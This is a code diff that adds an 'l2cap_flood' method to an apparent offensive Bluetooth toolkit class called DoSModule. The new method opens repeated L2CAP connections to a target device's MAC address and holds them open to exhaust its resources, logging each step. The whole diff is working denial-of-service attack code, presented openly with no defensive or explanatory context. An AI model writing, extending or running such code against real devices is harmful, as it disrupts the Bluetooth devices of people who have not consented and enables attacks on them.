@@ -42,3 +42,34 @@ class DoSModule:
                 break
         
         self.log("[bold green][*] Flood complete.[/bold green]")
+
+    def l2cap_flood(self, target_mac, max_conns=50):
+        self.log(f"[bold red][*] Starting L2CAP Resource Exhaustion against {target_mac}...[/bold red]")
+        sockets = []
+        import socket
+        
+        try:
+            for i in range(max_conns):
+                try:
+                    s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP)
+                    s.settimeout(2)
+                    s.connect((target_mac, 0x1001))
+                    sockets.append(s)
+                    self.log(f"[green][+] Connected socket #{i+1}[/green]")
+                    time.sleep(0.1)
+                except Exception as e:
+                    self.log(f"[yellow][!] Connection limit reached or refusal at #{i+1}: {e}[/yellow]")
+                    break
+        except KeyboardInterrupt:
+             self.log("\n[yellow][*] Stopping Flood...[/yellow]")
+        
+        self.log(f"[bold blue][*] Holding {len(sockets)} connections open... (Ctrl+C to release)[/bold blue]")
+        try:
+            while True:
+                time.sleep(1)
+        except KeyboardInterrupt:
+            pass
+            
+        for s in sockets:
+            s.close()
+        self.log("[*] Released all connections.")
